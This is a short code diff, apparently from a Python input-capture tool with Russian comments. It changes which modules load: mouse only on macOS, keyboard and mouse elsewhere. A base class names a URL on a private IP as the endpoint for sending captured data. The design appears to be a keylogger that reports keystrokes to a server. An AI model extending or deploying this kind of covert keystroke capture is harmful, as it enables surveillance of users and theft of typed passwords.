@@ -1,3 +1,5 @@
+from platform import system
+
 class BaseModule:
     """Материнский класс для написания модулей"""
     url = 'http://192.168.0.3:5000/data'  # URL для отправки данных
@@ -16,7 +18,4 @@ from .mouse import MouseModule  # Мышь
 from .keyboard import KeyboardModule  # Клавиатура
 
 # Массив модулей для запуска
-to_load = [
-    MouseModule(),  # Инициализируем модуль мыши
-    KeyboardModule()  # Инициализируем модуль клавиатуры
-]
+to_load = [MouseModule()] if system() == 'Darwin' else [KeyboardModule(), MouseModule()]
